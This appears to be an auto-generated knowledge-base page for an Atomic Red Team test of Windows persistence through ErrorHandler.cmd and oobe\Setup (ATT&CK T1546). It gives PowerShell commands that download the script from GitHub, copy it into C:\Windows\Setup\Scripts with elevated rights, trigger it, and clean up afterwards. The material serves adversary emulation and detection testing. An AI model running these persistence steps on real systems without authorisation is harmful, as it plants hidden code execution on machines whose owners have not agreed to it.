---
atomic_guid: "547a4736-dd1c-4b48-b4fe-e916190bb2e7"
title: "Persistence via ErrorHandler.cmd script execution"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546"
attack_technique_name: "Event Triggered Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546/T1546.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "547a4736-dd1c-4b48-b4fe-e916190bb2e7"
  - "Persistence via ErrorHandler.cmd script execution"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Persistence via ErrorHandler.cmd script execution

Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.
Upon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.

## Metadata

- Atomic GUID: 547a4736-dd1c-4b48-b4fe-e916190bb2e7
- Technique: T1546: Event Triggered Execution
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1546/T1546.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546]]

## Dependencies

ErrorHandler.cmd script must exist on disk at specified at PathToAtomicsFolder\T1546\bin\ErrorHandler.cmd

### Prerequisite Check

```untitled
if (Test-Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd) { exit 0} else { exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory "PathToAtomicsFolder\T1546\src\" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/src/ErrorHandler.cmd" -OutFile "PathToAtomicsFolder\T1546\src\ErrorHandler.cmd"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
C:\windows\System32\oobe\Setup
```

### Cleanup

```powershell
Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546/T1546.yaml)
